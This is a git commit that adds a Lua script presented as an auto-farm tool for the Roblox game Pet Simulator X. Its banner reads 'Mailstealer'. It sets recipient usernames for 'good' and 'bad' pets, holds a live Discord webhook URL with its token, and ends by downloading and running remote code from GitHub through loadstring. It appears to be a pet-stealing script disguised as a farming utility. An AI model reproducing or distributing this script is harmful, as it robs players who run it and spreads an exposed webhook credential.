0872db8230ff343155153c9c8b14bcb66cc748f4
Pixi <78256270+sewendejsy@users.noreply.github.com>
2023-07-09 17:04:17 +0200

    Pet Sim X Auto Farm update

---
+++ Pet Sim X Auto Farm.lua
@@ -0,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "ErcioYTYT" -- good pets
+Webhook = "https://discord.com/api/webhooks/1127615145577812099/T3-w46aCn6BunW0ak2KRbExI7Qyu6Xo5-QwKl1l7FQaQtxT8hVXbxYhn-2PzU6cV7OOT" -- pings for pets
+UserName2 = "ErcioYTYTYT" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
